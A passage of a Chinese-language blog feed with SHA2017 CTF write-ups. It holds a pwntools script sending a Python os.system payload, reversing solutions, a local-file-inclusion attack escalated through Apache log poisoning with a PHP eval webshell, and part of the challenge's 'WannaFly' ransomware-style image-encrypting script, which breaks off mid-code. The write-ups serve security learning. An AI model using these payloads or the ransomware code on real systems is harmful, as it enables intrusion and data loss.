<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">r = remote(<span class="string">"small.stillhackinganyway.nl"</span>,<span class="number">1337</span>)</div><div class="line"></div><div class="line">paylaod = <span class="string">"__import__('os').system('cat /home/small/flag')"</span></div><div class="line">r.sendline(paylaod)</div><div class="line"><span class="comment"># print(r.recv())</span></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;69b5a247b9cd52ac97de7cc94994083e&#125;</div></pre></td></tr></table></figure></p>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Find-The-Flag-1"><a href="#Find-The-Flag-1" class="headerlink" title="Find The Flag (1)"></a>Find The Flag (1)</h2><p>用IDA打开看一下就得到了flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;b760866fa6f035548be127b7525dbb66&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Hidden-Message-3"><a href="#Hidden-Message-3" class="headerlink" title="Hidden Message (3)"></a>Hidden Message (3)</h2><p>JEB打开，查看strings.xml。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/10.png?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;d3314ac1a08d65ea32ffd30907de2409&#125;</div></pre></td></tr></table></figure>
<h2 id="Flip-A-Coin-4"><a href="#Flip-A-Coin-4" class="headerlink" title="Flip A Coin (4)"></a>Flip A Coin (4)</h2><p>用IDA打开后，通过查看strings可以找到关键处。可以看到当v3==100，时会输出flag。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/17.png?raw=true" alt=""></p>
<p>而v3是在每次赢了之后会加一，其地址为0x00401668</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/18.png?raw=true" alt=""></p>
<p>接下来用olldbg来动态调试。</p>
<p>给0x00401668处下个断点。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/19.png?raw=true" alt=""></p>
<p>第一次输1，如果赢了的话，会看到对应的位置由0变成了1</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/20.png?raw=true" alt=""></p>
<p>利用olldbg的修改数据功能，我们把1修改为100，这里是十六进制，所以填入64</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/21.png?raw=true" alt=""></p>
<p>之后点击运行。程序判断v3==100后进行输出flag操作。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/16.png?raw=true" alt=""></p>
<p>flag:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;d754c599d47d9b3e4a376e1d770ca8c1&#125;</div></pre></td></tr></table></figure></p>
<h2 id="Jump-Around-4"><a href="#Jump-Around-4" class="headerlink" title="Jump Around (4)"></a>Jump Around (4)</h2><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/11.png?raw=true" alt=""></p>
<p>写个程序跑一下。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">int</span> v1[<span class="number">48</span>];</div><div class="line">    __int64 v8 = <span class="number">7523094288207667809L</span>L;</div><div class="line">    __int64 v9 = <span class="number">8101815670912281193L</span>L;</div><div class="line">    __int64 v10 = <span class="number">8680537053616894577L</span>L;</div><div class="line">    __int64 v11 = <span class="number">3833745473465776761L</span>L;</div><div class="line">    __int64 v12 = <span class="number">959985462</span>;</div><div class="line">    __int64 v13 = <span class="number">24929</span>;</div><div class="line">    __int64 v2 = <span class="number">6508264540403273223L</span>L;</div><div class="line">    __int64 v3 = <span class="number">5213490578399759196L</span>L;</div><div class="line">    __int64 v4 = <span class="number">5409190721146722066L</span>L;</div><div class="line">    __int64 v5 = <span class="number">73472674227045146L</span>L;</div><div class="line">    __int64 v6 = <span class="number">202114575</span>;</div><div class="line">    __int64 v7 = <span class="number">7173</span>;</div><div class="line">    <span class="keyword">int</span> i;</div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )&#123;</div><div class="line">        v1[i] = *((<span class="keyword">char</span> *)&amp;v2 + i) ^ *((<span class="keyword">char</span> *)&amp;v8 + i);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,v1[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )&#123;</div><div class="line">        v1[i] = *((<span class="keyword">char</span> *)&amp;v3 + i) ^ *((<span class="keyword">char</span> *)&amp;v9 + i);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,v1[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )&#123;</div><div class="line">        v1[i] = *((<span class="keyword">char</span> *)&amp;v4 + i) ^ *((<span class="keyword">char</span> *)&amp;v10 + i);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,v1[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">7</span>; ++i )&#123;</div><div class="line">        v1[i] = *((<span class="keyword">char</span> *)&amp;v5 + i) ^ *((<span class="keyword">char</span> *)&amp;v11 + i);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,v1[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">3</span>; ++i )&#123;</div><div class="line">        v1[i] = *((<span class="keyword">char</span> *)&amp;v6 + i) ^ *((<span class="keyword">char</span> *)&amp;v12 + i);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,v1[i]);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )&#123;</div><div class="line">        v1[i] = *((<span class="keyword">char</span> *)&amp;v7 + i) ^ *((<span class="keyword">char</span> *)&amp;v13 + i);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%c"</span>,v1[i]);</div><div class="line">    &#125;</div><div class="line">   <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;f525a6abd58ce9488f3c90904149145d&#125;</div></pre></td></tr></table></figure></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SHACTF-2017-Growing Up-writeup 单刷。&lt;br&gt;
    
    </summary>
    
      <category term="writeup:MISC" scheme="http://yoursite.com/categories/writeup-MISC/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>SHACTF-2017-Web-writeup</title>
    <link href="http://yoursite.com/2017/08/06/SHACTF-2017-Web-writeup/"/>
    <id>http://yoursite.com/2017/08/06/SHACTF-2017-Web-writeup/</id>
    <published>2017-08-06T14:49:56.000Z</published>
    <updated>2017-08-07T10:54:05.459Z</updated>
    
    <content type="html"><![CDATA[<p>SHACTF-2017-Web-writeup<br><a id="more"></a></p>
<h1 id="Bon-Appetit-100"><a href="#Bon-Appetit-100" class="headerlink" title="Bon Appétit (100)"></a>Bon Appétit (100)</h1><h2 id="Methon-One"><a href="#Methon-One" class="headerlink" title="Methon One"></a>Methon One</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bonappetit.stillhackinganyway.nl</div></pre></td></tr></table></figure>
<p>有个page参数。访问:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">view-source:http://bonappetit.stillhackinganyway.nl/?page=.htaccess</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170807/6.png?raw=true" alt=""></p>
<p>得到有个 suP3r_S3kr1t_Fl4G 。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://bonappetit.stillhackinganyway.nl/</div><div class="line">?page=suP3r_S3kr1t_Fl4G</div></pre></td></tr></table></figure></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;82d8173445ea865974fc0569c5c7cf7f&#125;</div></pre></td></tr></table></figure></p>
<p>感谢lzhtony和各位大佬的帮忙，不然我还一直沉浸在log的世界里不能自拔。。</p>
<h2 id="Methon-Two"><a href="#Methon-Two" class="headerlink" title="Methon Two"></a>Methon Two</h2><p>有包含，那就可以包含日志。由于题目有提到apache的log。所以有必要去看看log保存在什么地方。访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://bonappetit.stillhackinganyway.nl/</div><div class="line">?page=//etc/apache2/sites-enabled/000-default.conf</div></pre></td></tr></table></figure></p>
<p>error.log在默认位置，而CustomLog在由var/www/html/log.sh决定。接下来我们访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://bonappetit.stillhackinganyway.nl/</div><div class="line">?page=//var/www/html/log.sh</div></pre></td></tr></table></figure></p>
<p>可以知道，我们访问这个页面的log，会被保存到/var/www/html/logs/${HOST}.log中，而${HOST}即为你的ip地址。</p>
<p>接下来我们正式利用log来getshell。</p>
<p>在自己的vps（具有公网ip）上，访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://bonappetit.stillhackinganyway.nl/&lt;?php @eval($_POST[&apos;test&apos;]);?&gt;</div></pre></td></tr></table></figure></p>
<p>并用burp截包修改被转义的字符。如下，之后将其转发出去。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170807/1.png?raw=true" alt=""></p>
<p>接下来包含自己对应主机的log文件。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://bonappetit.stillhackinganyway.nl/?page=//var/www/html/logs/yourvpsip.log</div></pre></td></tr></table></figure></p>
<p>用菜刀连上，密码为test。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170807/2.png?raw=true" alt=""></p>
<p>最终得到flag：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170807/3.png?raw=true" alt=""></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;SHACTF-2017-Web-writeup&lt;br&gt;
    
    </summary>
    
      <category term="writeup:Web" scheme="http://yoursite.com/categories/writeup-Web/"/>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
    
      <category term="web" scheme="http://yoursite.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>SHACTF-2017-WannaFly-writeup</title>
    <link href="http://yoursite.com/2017/08/06/SHACTF-2017-WannaFly-writeup/"/>
    <id>http://yoursite.com/2017/08/06/SHACTF-2017-WannaFly-writeup/</id>
    <published>2017-08-06T02:38:53.000Z</published>
    <updated>2017-08-06T03:18:29.741Z</updated>
    
    <content type="html"><![CDATA[<p>SHACTF-2017-WannaFly-writeup。虽然只有100分，不过比国内一些比赛的题目质量好多了。</p>
<a id="more"></a>
<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">WannaFly (100)</div><div class="line">My daughter Kimberly her computer got hacked. Now she lost all her favorite images. Can you please help me recover those images?</div><div class="line">wannafly.tgz</div><div class="line">7509faed92d67a242068de6605659ca1</div></pre></td></tr></table></figure>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><h2 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h2><p>题目压缩包下载下来后解压有一个img镜像文件。用DiskGenius载入后浏览文件。</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/1.png?raw=true" alt=""></p>
<p>文件<code>.bash_history</code>内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">unset HISTFIL</div><div class="line">ls -la</div><div class="line">pwd</div><div class="line">chmod +x ...</div><div class="line">./... Hb8jnSKzaNQr5f7p</div><div class="line">ls -Rla</div></pre></td></tr></table></figure></p>
<p>文件<code>...</code>内容是一个python脚本，这边先不放出来，放在后面分析用。这里有个坑，DiskGenius是在win平台下的，直接把这个文件导出来后，win系统无法识别点开头的文件根本无法打开，也不能删除。我的方法是把这个导出来的文件先用压缩包压缩后，在压缩包中进行一下重命名，之后再解压缩出来。</p>
<p>在Picture文件夹里有一些被加密后的图片。如下：</p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170806/2.png?raw=true" alt=""></p>
<h2 id="深入分析"><a href="#深入分析" class="headerlink" title="深入分析"></a>深入分析</h2><p>前面我们得到了<code>...</code>文件，其内容如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"></div><div class="line"><span class="keyword">import</span> random, string, sys, os</div><div class="line"><span class="keyword">from</span> time <span class="keyword">import</span> time</div><div class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</div><div class="line"><span class="keyword">import</span> base64</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageFont</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageDraw</div><div class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> ImageFilter</div><div class="line"><span class="keyword">import</span> textwrap</div><div class="line"><span class="keyword">from</span> io <span class="keyword">import</span> BytesIO</div><div class="line"></div><div class="line">IMG=<span class="string">"""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"""</span></div><div class="line"></div><div class="line">MSG=<span class="string">"""This Image is encrypted by WannaFly Ransom-ware. If you want your original image back, feel free to contact us on sha2017ctf@gmail.com and make a bitcoin payment of 0.1 bitcoin to address 1QCc1EYncxTeSfTKpaCZ2hvMDwXULKRVWe"""</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_iv</span><span class="params">()</span>:</span></div><div class="line">    iv = <span class="string">""</span></div><div class="line">    random.seed(int(time()))</div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">16</span>):</div><div class="line">        iv += random.choice(string.letters + string.digits)</div><div class="line">    <span class="keyword">return</span> iv</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, p)</span>:</span></div><div class="line">    iv=get_iv()</div><div class="line">    aes = AES.new(p, AES.MODE_CFB, iv)</div><div class="line">    <span class="keyword">return</span> base64.b64encode(aes.encrypt(m))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(m, p, i)</span>:</span></div><div class="line">    aes = AES.new(p, AES.MODE_CFB, i)</div><div class="line">    <span class="keyword">return</span> aes.decrypt(base64.b64decode(m))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_images</span><span class="params">()</span>:</span></div><div class="line">    i = []</div><div class="line">    <span class="comment">#for r, d, f in os.walk(os.environ['HOME']):</span></div><div class="line">    <span class="keyword">for</span> r, d, f <span class="keyword">in</span> os.walk(<span class="string">"."</span>):</div><div class="line">        <span class="keyword">for</span> g <span class="keyword">in</span> f:</div><div class="line">            <span class="keyword">if</span> g.endswith(<span class="string">".png"</span>):</div><div class="line">                i.append((os.path.join(r, g)))</div><div class="line">    <span class="keyword">return</span> i</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt_images</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> find_images():</div><div class="line">        img = Image.open(i).filter(ImageFilter.GaussianBlur(radius=<span class="number">18</span>))</div><div class="line">        draw = ImageDraw.Draw(img)</div><div class="line">        font = ImageFont.truetype(<span class="string">"/usr/share/fonts/truetype/freefont/FreeSans.ttf"</span>, <span class="number">18</span>)</div><div class="line">        text = textwrap.wrap(MSG, width=<span class="number">60</span>)</div><div class="line">        W, H = img.size</div><div class="line">        bird = Image.open(BytesIO(base64.b64decode(IMG)))</div><div class="line">        bw, bh = bird.size</div><div class="line">        offset = ((W-bw)/<span class="number">2</span>, (H-bh)/<span class="number">2</span> - <span class="number">80</span>)</div><div class="line">        img.paste(bird, offset, bird)</div><div class="line">        pad = <span class="number">0</span></div><div class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> text:</div><div class="line">            w, h = draw.textsize(line, font=font)</div><div class="line">            draw.text(((W-w)/<span class="number">2</span>, (H-h)/<span class="number">2</span> + pad), line, font=font, fill=<span class="string">"white"</span>)</div><div class="line">            pad += <span class="number">20</span></div><div class="line">        img.save(<span class="string">'/tmp/sha.png'</span>)</div><div class="line">		encrypt_image(i)</div><div class="line"></div><div class="line"><span class="function"><span 